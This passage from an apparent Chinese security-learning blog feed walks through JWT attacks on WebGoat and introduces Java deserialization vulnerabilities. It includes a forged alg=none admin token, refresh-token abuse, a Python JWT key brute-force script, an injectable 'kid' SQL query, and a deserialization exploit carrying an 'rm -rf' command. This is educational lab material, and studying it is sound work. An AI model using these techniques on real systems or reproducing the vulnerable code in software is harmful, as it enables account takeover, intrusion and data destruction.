&quot;Not:A-Brand&quot;;v=&quot;99&quot;</span><br><span class="line">sec-ch-ua-mobile: ?0</span><br><span class="line">Authorization: Bearer null</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>我们有一个JWT token：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJhbGciOiJIUzUxMiJ9.eyJpYXQiOjE1MjYxMzE0MTEsImV4cCI6MTUyNjIxNzgxMSwiYWRtaW4iOiJmYWxzZSIsInVzZXIiOiJUb20ifQ.DCoaq9zQkyDH25EcVWKcdbyVfUL4c9D4jRvsqOqvi9iAd4QuqmKcchfbU8FNzeBNF9tLeFXHZLU4yRkq-bjm7Q</span><br></pre></td></tr></table></figure><h3 id="第一种更改时间-algnone"><a class="markdownIt-Anchor" href="#第一种更改时间-algnone"></a> 第一种：更改时间 &amp;&amp; alg=none</h3><p>分析得到这个token早就过期了，那么我们<strong>重新弄一下这个过期时间</strong>，然后把签名去掉。参考上面的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJhbGciOiJub25lIn0.eyJpYXQiOjE1MjYxMzE0MTEsImV4cCI6IDE2ODYyOTAzMTgsImFkbWluIjoidHJ1ZSIsInVzZXIiOiJUb20ifQ.</span><br></pre></td></tr></table></figure><h3 id="第二种使用refresh-token"><a class="markdownIt-Anchor" href="#第二种使用refresh-token"></a> 第二种：使用refresh token</h3><p>通常，在响应 JWT 身份验证/刷新请求时，你会得到如下所示的内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;code&quot;:0,&quot;data&quot;:&#123;&quot;access_token&quot;:&quot;XXX.YYY.ZZZ&quot;,&quot;access_token_expiration&quot;:&quot;Thursday, November 9th, 2017, 10:27:33 PM&quot;,&quot;refresh_token&quot;:&quot;ABC123&quot;&#125;&#125;</span><br></pre></td></tr></table></figure><p>此示例中的访问令牌将于10:27:33过期。通常，应用程序将使用刷新令牌在到期日期之前刷新/获取新的访问令牌。该请求将转到授权服务器，如下所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST /auth/refresh HTTP/1.1</span><br><span class="line">Host: auth.example.com</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Authorization: Bearer XXX.YYY.ZZZ</span><br><span class="line"></span><br><span class="line">&#123;&quot;refresh_token&quot;:&quot;ABC123&quot;&#125;</span><br></pre></td></tr></table></figure><p>当前访问令牌位于授权标头中，刷新令牌位于 POST 正文中。作为回报，您将获得一个全新的访问令牌、到期日期和刷新令牌。则我们伪造：<strong>使用我的刷新令牌刷新其他人的访问令牌</strong></p><p><strong>操作如下：</strong></p><ol><li><p>F12查看流量，搜索：refresh_token，得到：</p><img src="/images/JWT%E5%AE%89%E5%85%A8/image-20230608113035376.png" alt="image-20230608113035376" style="zoom:50%;" /></li><li><p>获取这个refresh_token，还有之前tom的token，抓包贴上（改URL，改content-type…），如下，就可刷新我们的token了，我们的token就不怕过期了！（得到URL的方式也很重要）</p><img src="/images/JWT%E5%AE%89%E5%85%A8/image-20230608113958918.png" alt="image-20230608113958918" style="zoom:50%;" /><img src="/images/JWT%E5%AE%89%E5%85%A8/image-20230608113551369-16861953534983.png" alt="image-20230608113551369" style="zoom: 50%;" /></li><li><p>贴上我们刚获得的token，就OK了！</p><img src="/images/JWT%E5%AE%89%E5%85%A8/image-20230608113811331.png" alt="image-20230608113811331" style="zoom: 50%;" /></li></ol><h2 id="代码审计"><a class="markdownIt-Anchor" href="#代码审计"></a> 代码审计</h2><h3 id="更改token细节匹配"><a class="markdownIt-Anchor" href="#更改token细节匹配"></a> 更改token细节——匹配</h3><p>对比下面两个代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">try &#123;</span><br><span class="line">   Jwt jwt = Jwts.parser().setSigningKey(JWT_PASSWORD).parseClaimsJws(accessToken);</span><br><span class="line">   Claims claims = (Claims) jwt.getBody();</span><br><span class="line">   String user = (String) claims.get(&quot;user&quot;);</span><br><span class="line">   boolean isAdmin = Boolean.valueOf((String) claims.get(&quot;admin&quot;));</span><br><span class="line">   if (isAdmin) &#123;</span><br><span class="line">     removeAllUsers();</span><br><span class="line">   &#125; else &#123;</span><br><span class="line">     log.error(&quot;You are not an admin user&quot;);</span><br><span class="line">   &#125;</span><br><span class="line">&#125; catch (JwtException e) &#123;</span><br><span class="line">  throw new InvalidTokenException(e);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">try &#123;</span><br><span class="line">   Jwt jwt = Jwts.parser().setSigningKey(JWT_PASSWORD).parse(accessToken);</span><br><span class="line">   Claims claims = (Claims) jwt.getBody();</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>就是第2行代码不一样。主要涉及两个函数：</p><ol><li>parseClaimsJws：</li><li>parse</li></ol><h3 id="refresh-token生成"><a class="markdownIt-Anchor" href="#refresh-token生成"></a> refresh token——生成</h3><p>看到代码存在两个POSTMAPPING：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">@PostMapping(&#123;&quot;/JWT/refresh/checkout&quot;&#125;)</span><br><span class="line">@PostMapping(&#123;&quot;/JWT/refresh/newToken&quot;&#125;)</span><br></pre></td></tr></table></figure><p>第一个是确认订单的，主要看第二个生成refresh token：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@PostMapping(</span></span><br><span class="line"><span class="meta">    value = &#123;&quot;/JWT/refresh/login&quot;&#125;,</span></span><br><span class="line"><span class="meta">    consumes = &#123;&quot;application/json&quot;&#125;,</span></span><br><span class="line"><span class="meta">    produces = &#123;&quot;application/json&quot;&#125;</span></span><br><span class="line"><span class="meta">)</span></span><br><span class="line"><span class="meta">@ResponseBody</span></span><br><span class="line"><span class="keyword">public</span> ResponseEntity <span class="title function_">follow</span><span class="params">(<span class="meta">@RequestBody(required = false)</span> Map&lt;String, Object&gt; json)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (json == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> ResponseEntity.status(HttpStatus.UNAUTHORIZED).build();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">user</span> <span class="operator">=</span> (String)json.get(<span class="string">&quot;user&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">password</span> <span class="operator">=</span> (String)json.get(<span class="string">&quot;password&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Jerry&quot;</span>.equalsIgnoreCase(user) &amp;&amp; <span class="string">&quot;bm5nhSkxCXZkKRy4&quot;</span>.equals(password) ? ResponseEntity.ok(<span class="built_in">this</span>.createNewTokens(user)) : ResponseEntity.status(HttpStatus.UNAUTHORIZED).build();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> ResponseEntity <span class="title function_">newToken</span><span class="params">(<span class="meta">@RequestHeader(value = &quot;Authorization&quot;,required = false)</span> String token, <span class="meta">@RequestBody(required = false)</span> Map&lt;String, Object&gt; json)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (token != <span class="literal">null</span> &amp;&amp; json != <span class="literal">null</span>) &#123;</span><br><span class="line">            String user;</span><br><span class="line">            String refreshToken;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Jwt&lt;Header, Claims&gt; jwt = Jwts.parser().setSigningKey(<span class="string">&quot;bm5n3SkxCX4kKRy4&quot;</span>).parse(token.replace(<span class="string">&quot;Bearer &quot;</span>, <span class="string">&quot;&quot;</span>));</span><br><span class="line">                user = (String)((Claims)jwt.getBody()).get(<span class="string">&quot;user&quot;</span>);</span><br><span class="line">                refreshToken = (String)json.get(<span class="string">&quot;refresh_token&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (ExpiredJwtException var6) &#123;</span><br><span class="line">                user = (String)var6.getClaims().get(<span class="string">&quot;user&quot;</span>);</span><br><span class="line">                refreshToken = (String)json.get(<span class="string">&quot;refresh_token&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (user != <span class="literal">null</span> &amp;&amp; refreshToken != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (validRefreshTokens.contains(refreshToken)) &#123;</span><br><span class="line">                    validRefreshTokens.remove(refreshToken);</span><br><span class="line">                    <span class="keyword">return</span> ResponseEntity.ok(<span class="built_in">this</span>.createNewTokens(user));</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">return</span> ResponseEntity.status(HttpStatus.UNAUTHORIZED).build();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> ResponseEntity.status(HttpStatus.UNAUTHORIZED).build();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> ResponseEntity.status(HttpStatus.UNAUTHORIZED).build();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>从上面可以看到，我们需要的Username为Jerry，密码是静态的。那么根据responsebody，我们构造请求包，这里知道是json格式：通过checkout的请求包，将conten-type改为json，然后构造参数，即可获得refresh token。</p><p>在/JWT/refresh/newToken接口，首先接收Authorization的值，进行jwt解码，得到user，然后再从json中得到refresh_token，如果refresh_token有效，则刷新access_token。</p><h1 id="密钥爆破攻击"><a class="markdownIt-Anchor" href="#密钥爆破攻击"></a> 密钥爆破攻击</h1><p>相对于上面，如果我们有密钥，那么我们就可以跟着修改签名，重新构造数据包进行攻击。我们可以发起离线的暴力破解发起对密钥的攻击。字典的话需要自己找。具体流程如下：</p><ol><li><p>抓取到JWT token，分析得到如下：</p><img src="/images/JWT%E5%AE%89%E5%85%A8/image-20230608093247180.png" alt="image-20230608093247180" style="zoom:50%;" /></li><li><p>将token放到破解脚本里面</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">alg = <span class="string">&quot;HS256&quot;</span></span><br><span class="line">jwt_str = <span class="string">&quot;eyJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJXZWJHb2F0IFRva2VuIEJ1aWxkZXIiLCJhdWQiOiJ3ZWJnb2F0Lm9yZyIsImlhdCI6MTY4NjE4NzUwOCwiZXhwIjoxNjg2MTg3NTY4LCJzdWIiOiJ0b21Ad2ViZ29hdC5vcmciLCJ1c2VybmFtZSI6IlRvbSIsIkVtYWlsIjoidG9tQHdlYmdvYXQub3JnIiwiUm9sZSI6WyJNYW5hZ2VyIiwiUHJvamVjdCBBZG1pbmlzdHJhdG9yIl19.0TkftJKgV9kqnroqC_5QhsJdkxhl7x65m4ZPSA8Qq4M&quot;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;pass.txt&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">        key_ = line.strip()</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            jwt.decode(jwt_str, verify=<span class="literal">True</span>, key=key_, algorithms=<span class="string">&quot;HS256&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;found key! --&gt; &#x27;</span> + key_)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span>(jwt.exceptions.ExpiredSignatureError, jwt.exceptions.InvalidAudienceError,</span><br><span class="line">               jwt.exceptions.InvalidIssuedAtError, jwt.exceptions.InvalidIssuedAtError,</span><br><span class="line">               jwt.exceptions.ImmatureSignatureError):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;found key! --&gt; &#x27;</span> + key_)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span> jwt.exceptions.InvalidSignatureError:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;key not found!&quot;</span>)</span><br></pre></td></tr></table></figure><p>找个好一点的字典直接开干</p></li><li><p>破解到之后，<strong>大概率token已经过期了</strong>，所以重新生成（但是密钥应该不会变），重新构造，例如得到密钥：<code>shipping</code></p><img src="/images/JWT%E5%AE%89%E5%85%A8/image-20230608093530949.png" alt="image-20230608093530949" style="zoom:50%;" /></li></ol><h1 id="综合利用"><a class="markdownIt-Anchor" href="#综合利用"></a> 综合利用</h1><h2 id="与sql注入结合"><a class="markdownIt-Anchor" href="#与sql注入结合"></a> 与sql注入结合</h2><p>JWT由这个组成，看到kid不是自带的固定字段，所以可能有设么含义：</p><img src="/images/JWT%E5%AE%89%E5%85%A8/image-20230608122654080.png" alt="image-20230608122654080" style="zoom:50%;" /><p>然后看到源代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ResultSet rs = connection.createStatement().executeQuery(&quot;SELECT key FROM jwt_keys WHERE id = &#x27;&quot; + kid + &quot;&#x27;&quot;);</span><br><span class="line">...</span><br><span class="line">var6 = TextCodec.BASE64.decode(rs.getString(1));</span><br></pre></td></tr></table></figure><p>从Header中获取“kid”直接插入sql查询语句中，存在SQL注入，将返回结果进行了base64解码作为KEY，然后进行解析。然后解析后 ，username参数等于”Tom”，则删除。</p><p>参考：<a href="https://www.cnblogs.com/yokan/p/15202333.html">https://www.cnblogs.com/yokan/p/15202333.html</a></p><h2 id="nodejs前端jw登录安全伪造admin"><a class="markdownIt-Anchor" href="#nodejs前端jw登录安全伪造admin"></a> Node.js前端jw登录安全，伪造admin</h2><ol><li><p>注册用户登录，分析：<code>controllers/api.js</code>，看到需要我们伪造用户：admin</p></li><li><p>抓取数据包，进行解密修改后再加密，伪造登录即可</p></li></ol><h1 id="安全使用"><a class="markdownIt-Anchor" href="#安全使用"></a> 安全使用</h1><p>使用 JWT 时的一些最佳实践：</p><ul><li>固定算法，不允许客户端切换算法。</li><li>使用对称密钥对令牌进行签名时，请确保使用适当的密钥长度。</li><li>确保添加到令牌的声明不包含个人信息。如果您需要添加更多信息，也可以选择加密令牌。</li><li>向您的项目添加足够的测试用例以验证无效令牌实际上不起作用。与第三方集成以检查您的令牌并不意味着您根本没有测试您的应用程序。</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;jwt概念&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#jwt概念&quot;&gt;&lt;/a&gt; JWT概念&lt;/h1&gt;
&lt;p&gt;JSON Web Token（简称 JWT）是目前最流行的&lt;strong&gt;跨域认证&lt;/strong&gt;解决方案。是一种&lt;stro</summary>
      
    
    
    
    <category term="JAVA安全基础" scheme="https://j3f5.github.io/categories/JAVA%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"/>
    
    <category term="渗透测试基础" scheme="https://j3f5.github.io/categories/JAVA%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/"/>
    
    
    <category term="JWT" scheme="https://j3f5.github.io/tags/JWT/"/>
    
  </entry>
  
  <entry>
    <title>反序列化漏洞基础</title>
    <link href="https://j3f5.github.io/articles/2023/06/07/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/"/>
    <id>https://j3f5.github.io/articles/2023/06/07/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/</id>
    <published>2023-06-07T03:39:32.000Z</published>
    <updated>2023-06-07T03:39:32.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="java反序列化"><a class="markdownIt-Anchor" href="#java反序列化"></a> JAVA反序列化</h1><h2 id="概念"><a class="markdownIt-Anchor" href="#概念"></a> 概念</h2><img src="/images/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80.png" alt="JAVA反序列化基础" style="zoom:80%;" /><h3 id="序列化与反序列化"><a class="markdownIt-Anchor" href="#序列化与反序列化"></a> 序列化与反序列化</h3><p>Java 序列化是指把 Java 对象转换为字节序列的过程便于保存在内存、文件、数据库中，<code>ObjectOutputStream</code>类的 <code>writeObject() </code>方法可以实现序列化。</p><p>Java 反序列化是指把字节序列恢复为 Java 对象的过程，<code>ObjectInputStream </code>类的 <code>readObject() </code>方法用于反序列化。</p><p>序列化与反序列化是让 Java 对象脱离 Java 运行环境的一种手段，可以有效的<strong>实现多平台之间的通信、对象持久化存储</strong>。</p><img src="/images/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image-20230606110322164.png" alt="image-20230606110322164" style="zoom:50%;" /><p><strong>例子：</strong></p><blockquote><p>最常见的反序列化情况便是服务器的SESSION，当有大量用户并发访问，就有可能出现庞大数量的SESSION 对象，内存显然不够用，于是Web 容器便会将SESSION 先序列化到硬盘中，等需要使用时，再将保存在硬盘中的对象还原到内存中，这个存储再拿出来的过程便是序列化和反序列化的过程。</p></blockquote><h3 id="漏洞成因与危害"><a class="markdownIt-Anchor" href="#漏洞成因与危害"></a> 漏洞成因与危害</h3><p><strong>成因：Java 程序没有对反序列化生成的对象的类型做限制</strong>。在 Java 中反序列化漏洞之所以比较严重的原因之一是：Java 存在大量的公用库，例如Apache Commons Collections。而这其中实现的一些类可以被反序列化用来实现任意代码执行。WebLogic、WebSphere、JBoss、Jenkins、OpenNMS 这些应用的反序列化漏洞能够得以利用，便是依靠了Apache Commons Collections。当然反序列漏洞的根源并不在于公共库，他只是手段与途径。</p><p><strong>危害</strong>：<strong>任意代码执行，获取SHELL，对服务器进行破坏</strong>。</p><h3 id="涉及函数"><a class="markdownIt-Anchor" href="#涉及函数"></a> 涉及函数</h3><p><strong>ObjectOutputStream 类</strong></p><ul><li><strong>writeObject</strong>() 方法可以对参数指定的obj 对象进行<strong>序列化</strong>操作，并将得到的字节序列写到目标输出流中。</li></ul><p><strong>ObjectInputStream 类</strong></p><ul><li><strong>ReadObject</strong>()方法则是从源输入流中读取字节序列，再将其<strong>反序列化</strong>为对象并返回。</li></ul><p>可以序列化反序列化的类都需要声明接口Serializable</p><h3 id="漏洞利用的条件"><a class="markdownIt-Anchor" href="#漏洞利用的条件"></a> 漏洞利用的条件</h3><h4 id="存在利用链"><a class="markdownIt-Anchor" href="#存在利用链"></a> 存在利用链</h4><p>在程序中，通过方法调用、对象传递和反射机制等手段作为跳板，攻击者能构造出一个产生安全问题的利用链，如任意文件读取或写入、远程代码执行等漏洞。利用链又称作Gadget chain，利用链的构造往往由多个类对象组成，环环相扣就像一个链条。</p><h4 id="存在触发点"><a class="markdownIt-Anchor" href="#存在触发点"></a> 存在触发点</h4><p>程序中仅有一条利用链或者仅有一个反序列化的触发点都不会造成安全问题，不能被认定为漏洞。需要存在入口以及触发漏洞的函数。</p><h3 id="序列化字符串"><a class="markdownIt-Anchor" href="#序列化字符串"></a> 序列化字符串</h3><p>下方的特征可以作为序列化的标志参考：</p><ul><li>一段以<strong>rO0AB</strong>开头，基本可以确认是JAVA序列化字符串以<strong>base64</strong>加密的数据。<ul><li>序列化+base64</li></ul></li><li>一段以<strong>aced</strong>开头，基本就是JAVA序列化的16进制数据</li></ul><h2 id="测试用例webgoat与ysoserial"><a class="markdownIt-Anchor" href="#测试用例webgoat与ysoserial"></a> 测试用例（WebGoat与ysoserial）</h2><h3 id="基础反序列化"><a class="markdownIt-Anchor" href="#基础反序列化"></a> 基础反序列化</h3><p>著名含反序列化漏洞的代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">InputStream</span> <span class="variable">is</span> <span class="operator">=</span> request.getInputStream();</span><br><span class="line"><span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(is);</span><br><span class="line"><span class="type">AcmeObject</span> <span class="variable">acme</span> <span class="operator">=</span> (AcmeObject)ois.readObject();</span><br></pre></td></tr></table></figure><p>它期待着一个AcmeObject对象，但它会在铸造发生之前执行readObject()。如果攻击者找到了在readObject()中实现危险操作的适当的类，他可以将该对象序列化，并强迫受攻击的应用程序执行这些操作。攻击者需要在classpath中找到一个支持序列化并在readObject()上有危险实现的类。【也就是利用链】</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.dummy.insecure.framework;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.time.LocalDateTime;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">VulnerableTaskHolder</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> String taskName;</span><br><span class="line">        <span class="keyword">private</span> String taskAction;</span><br><span class="line">        <span class="keyword">private</span> LocalDateTime requestedExecutionTime;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">VulnerableTaskHolder</span><span class="params">(String taskName, String taskAction)</span> &#123;</span><br><span class="line">                <span class="built_in">super</span>();</span><br><span class="line">                <span class="built_in">this</span>.taskName = taskName;</span><br><span class="line">                <span class="built_in">this</span>.taskAction = taskAction;</span><br><span class="line">                <span class="built_in">this</span>.requestedExecutionTime = LocalDateTime.now();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">( ObjectInputStream stream )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//deserialize data so taskName and taskAction are available</span></span><br><span class="line">                stream.defaultReadObject();</span><br><span class="line">                <span class="comment">//blindly run some code. #code injection</span></span><br><span class="line">                Runtime.getRuntime().exec(taskAction);</span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果上图所示的java类存在，攻击者可以将该对象序列化并获得远程代码执行。利用链如下：用户定义了一个VulnerableTaskHolder对象Go，然后传入对应的参数值，对我们构造的恶意对象进行序列化，将会出发<code>Runtime.getRuntime().exec(taskAction);</code>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">VulnerableTaskHolder</span> <span class="variable">go</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">VulnerableTaskHolder</span>(<span class="string">&quot;delete all&quot;</span>, <span class="string">&quot;rm -rf somefile&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">ByteArrayOutputStream</span> <span class="variable">bos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line"><span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(bos);</span><br><span class="line">oos.writeObject(go);</span><br><span class="line">oos.flush();</span><br><span class="line"><span class="type">byte</span>[] exploit = bos.toByteArray();</span><br></pre></td></tr></table></figure><h3 id="ysoserial样例分析urldns样例"><a class="markdownIt-Anchor" href="#ysoserial样例分析urldns样例"></a> ysoserial样例分析（URLDNS样例）</h3><p>这个是<a href="https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java%E7%9A%84%E4%B8%80%E4%B8%AA%E9%A1%B9%E7%9B%AE%EF%BC%8C%E6%8C%89%E7%85%A7%E5%88%AB%E4%BA%BA%E7%9A%84payload%E6%9D%A5%E5%AD%A6%E4%B9%A0%E6%9F%90%E4%B8%AA%E6%A8%A1%E5%9D%97%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E3%80%82">https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java的一个项目，按照别人的payload来学习某个模块是否存在反序列化漏洞。</a></p><p>主要代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">public Object getObject(String url) throws Exception &#123;</span><br><span class="line">    URLStreamHandler handler = new SilentURLStreamHandler();</span><br><span class="line">    HashMap ht = new HashMap();</span><br><span class="line">    URL u = new URL((URL)null, url, handler);</span><br><span class="line">    ht.put(u, url);</span><br><span class="line">    Reflections.setFieldValue(u, &quot;hashCode&quot;, -1);</span><br><span class="line">    return ht;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里面涉及几个类，一个是URL一个是HashMap。先循序渐进，看类与方法。怎么看类？找<code>readObject</code>和<code>writeObject</code>类看到两个个类，HashMap有readObject方法。</p><p>看到一个方法<code>put</code>，那就ctrl+b进去</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public V put(K key, V value) &#123;</span><br><span class="line">    return putVal(hash(key), key, value, false, true);</span><br><span 